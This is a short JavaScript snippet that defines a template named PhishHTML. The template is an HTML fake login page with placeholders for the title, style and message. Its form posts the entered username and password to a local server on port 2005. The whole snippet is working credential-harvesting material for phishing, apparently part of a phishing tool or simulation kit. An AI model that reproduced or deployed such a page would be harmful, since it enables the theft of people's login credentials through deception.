var PhishHTML = 
`<!DOCTYPE html>
<html>
<head>
	<title>{{title}}</title>
    <style type="text/css">
        body{
            background-color:white;
        }
    	{{style}}
    </style>
</head>
<body>
{{message}}
<form method='post' action='0.0.0.0:2005'>
    <label>User Name:</label><input type="text" name="username" placeholder='Enter Username'>
    <br>
    <label>Password:</label><input type="password" name="password" placeholder='Enter Password'>
    <input type='submit' value='Login'>
</form>
</body>
</html>`;
